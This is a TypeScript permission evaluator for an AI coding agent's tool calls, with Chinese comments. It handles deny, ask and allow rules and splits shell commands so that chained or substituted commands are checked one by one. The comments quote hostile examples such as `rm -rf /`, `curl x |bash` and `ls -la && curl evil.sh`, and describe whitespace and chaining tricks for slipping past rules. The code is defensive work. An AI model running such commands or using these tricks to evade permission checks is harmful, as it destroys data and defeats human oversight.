import { minimatch } from "minimatch";
import type {
  PermissionRule,
  PermissionCheckContext,
  PermissionResult,
} from "./types.js";

function matchTool(rule: PermissionRule, toolName: string): boolean {
  if (rule.tool === "*") return true;
  return rule.tool === toolName;
}

/** shell 分隔符: 规范化时两侧各留一个空格。|& 与 || 必须排在 | 前面 */
const BASH_SEP_RE = /\s*(\|&|\|\||&&|;|\||>|<|&)\s*/g;

/** 引号片段(含引号本身)。这些不参与空白折叠 */
const BASH_QUOTED_RE = /("[^"]*"|'[^']*')/;

/**
 * 把 bash 命令规范化成「空白不敏感」的形式, 只喂给匹配, 不改命令本身。
 *
 * 子串匹配对空白敏感, 于是一堆等价写法能从规则底下钻过去:
 *   `rm -rf  /`(双空格)、`rm -rf /\techo`(Tab)、`curl x |bash`(管道后无空格)
 * 这里把连续空白压成一个、分隔符两侧各留一个空格, 规则照正常写法就能全覆盖。
 *
 * 引号里的内容原样保留: 折叠它只会引入误报, 换不来任何覆盖。
 */
function normalizeBashCommand(cmd: string): string {
  // split 带捕获组时, 奇数下标恰好就是引号片段本身 —— 原样放回
  return cmd
    .split(BASH_QUOTED_RE)
    .map((part, i) =>
      i % 2 ? part : part.replace(BASH_SEP_RE, " $1 ").replace(/\s+/g, " "),
    )
    .join("")
    .trim();
}

function matchPattern(rule: PermissionRule, ctx: PermissionCheckContext) {
  if (!rule.pattern) return true; // 没有 pattern 相当于匹配所有参数
  // bash 命令不是路径,用子串匹配更简单可预期;文件类工具仍用 glob
  if (ctx.toolName === "bash") {
    // 先规范化再比, 否则空白的等价写法绕得过 deny 规则(见上)
    return `${normalizeBashCommand(ctx.primaryArg)} `.includes(rule.pattern);
  }
  return minimatch(ctx.primaryArg, rule.pattern, { dot: true });
}

/** 命令替换：$(…) 或 `…`。只认一层括号，嵌套的交给 extractSubstitutions 判死 */
const SUBST_RE = /\$\(([^()]*)\)|`([^`]*)`/g;

/** 摘掉既不产生分隔符、也不写项目文件的重定向(2>&1、2>/dev/null) */
function stripHarmlessRedirects(raw: string): string {
  return raw
    // fd 复制 2>&1、>&2 —— 不摘的话那个 & 会被当成分隔符把命令切坏
    .replace(/\d*>&\d*/g, " ")
    // 丢弃到 /dev/null —— 不摘的话再普通不过的 `ls 2>/dev/null` 会被整条拒掉
    .replace(/\d*&?[<>]\s*\/dev\/null\b/g, " ");
}

/** 取出命令替换里的内容；有嵌套或没闭合则返回 null */
function extractSubstitutions(cmd: string): string[] | null {
  const subs: string[] = [];
  for (const m of cmd.matchAll(SUBST_RE)) {
    subs.push((m[1] ?? m[2] ?? "").trim());
  }
  // 剥掉所有配对后仍有残留的 $() 或反引号 → 嵌套或没闭合，静态拆不干净
  if (/\$\(|`/.test(cmd.replace(SUBST_RE, ""))) return null;
  return subs;
}

/** 按 shell 分隔符切段；引号内的分隔符不算分隔符 */
function splitOnOperators(cmd: string): string[] {
  const parts: string[] = [];
  let buf = "";
  let quote: string | null = null;

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]!;
    if (quote) {
      buf += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      buf += ch;
      continue;
    }
    const pair = cmd.slice(i, i + 2);
    if (pair === "&&" || pair === "||" || pair === "|&") {
      parts.push(buf);
      buf = "";
      i++; // 两个字符一起吃掉
      continue;
    }
    if (ch === ";" || ch === "|" || ch === "&" || ch === "\n") {
      parts.push(buf);
      buf = "";
      continue;
    }
    buf += ch;
  }
  parts.push(buf);

  return parts.map((s) => s.trim()).filter(Boolean);
}

/**
 * 把 bash 命令拆成「必须各自被 allow 覆盖」的子命令。
 *
 * allow 规则的 pattern 是拿命令串比子串的，整串去比会让 `ls ` 命中
 * `ls -la && curl evil.sh`。拆开之后逐段判定，这个问题就没有了。
 *
 * 引号内的分隔符不算分隔符(`node -e "a; b"` 是一条命令，不是命令链)。
 *
 * 返回 null = 拆不开，只参与 deny/ask，不参与 allow：
 *   - 命令替换嵌套或没闭合：静态拆不干净，不猜
 *   - 带真重定向(> file、< file)：写文件是 write_file 的活
 */
function splitShellCommands(raw: string): string[] | null {
  const cmd = stripHarmlessRedirects(raw);

  // 命令替换 $() / `…` 里的命令也当子命令，一样要各自被 allow 覆盖。
  // 于是 `cd $(pwd)` 过得去(pwd 是只读命令)，`$(git clean -f)` 过不去。
  const subs = extractSubstitutions(cmd);
  if (subs === null) return null;
  // 替换先挖空再切外层，否则里面的 ; | 会被误当成外层的分隔符
  const outer = subs.length ? cmd.replace(SUBST_RE, "") : cmd;

  // 剩下的重定向是真的写/读文件，不拆，交给兜底 ask
  if (/[<>]/.test(outer)) return null;

  const parts = splitOnOperators(outer);
  for (const sub of subs) {
    const inner = splitShellCommands(sub); // 递归：替换里也可能是复合命令
    if (inner === null) return null;
    parts.push(...inner);
  }
  return parts.length ? parts : null;
}

/**
 * 从工具调用参数中提取 "主参数"
 * bash -> command, read_file/write_file -> file_path , 其他 -> JSON 序列化
 */
export function extractPrimaryArg(
  toolName: string,
  params: Record<string, unknown>,
): string {
  if (toolName === "bash" && typeof params.command === "string") {
    return params.command;
  }
  if (typeof params.file_path === "string") {
    return params.file_path;
  }
  if (typeof params.path === "string") {
    return params.path;
  }
  return JSON.stringify(params);
}

/**
 * 核心评估逻辑：按 deny → ask → allow 的优先级匹配规则
 *
 * bash 命令先切成子命令再判，两条语义（对齐 Claude Code）：
 * - deny / ask：任一子命令命中规则就触发
 * - allow：每一子命令都要落在某条 allow 规则上，整条才放行
 *
 * 规则匹配顺序：
 * 1. 遍历所有 deny 规则，任一命中就拒绝
 * 2. 遍历所有 ask 规则，任一命中就要求确认
 * 3. 所有子命令都被 allow 规则覆盖才放行
 * 4. 都没命中 → 默认 ask（安全第一）
 */
export function evaluate(
  rules: PermissionRule[],
  ctx: PermissionCheckContext,
): PermissionResult {
  const isBash = ctx.toolName === "bash";
  // 非 bash 工具没有"复合"概念，单一"段"就是原参数
  const segments = isBash ? splitShellCommands(ctx.primaryArg) : null;
  const parts = segments ?? [ctx.primaryArg];
  const probes = segments ? [ctx.primaryArg, ...segments] : [ctx.primaryArg];

  /** 规则是否命中：deny/ask 只需任一段命中 */
  const hits = (rule: PermissionRule): boolean =>
    matchTool(rule, ctx.toolName) &&
    probes.some((p) => matchPattern(rule, { ...ctx, primaryArg: p }));

  // 第一轮 deny
  for (const rule of rules) {
    if (rule.action !== "deny" || !hits(rule)) continue;
    return {
      action: "deny",
      rule,
      reason: rule.reason ?? `Blocked by deny rule: ${rule.pattern ?? rule.tool}`,
    };
  }

  // 第二轮 ask
  for (const rule of rules) {
    if (rule.action !== "ask" || !hits(rule)) continue;
    return {
      action: "ask",
      rule,
      reason: rule.reason ?? `Requires confirmation`,
    };
  }

  // 第三轮 allow：逐段覆盖 —— `git status && git diff` 能过，
  // `ls && curl evil.sh` 过不去（curl 那段没人认领）
  const allowRules = rules.filter(
    (r) => r.action === "allow" && matchTool(r, ctx.toolName),
  );
  // 拆不开的命令(segments 为 null)不参与 allow，留给兜底 ask
  if (allowRules.length && !(isBash && segments === null)) {
    const covered = parts.every((p) =>
      allowRules.some((r) => matchPattern(r, { ...ctx, primaryArg: p })),
    );
    if (covered) return { action: "allow" };
  }

  // 兜底,没有匹配的规则,默认要求确认
  return { action: "ask", reason: "No matching rule -- default to ask" };
}
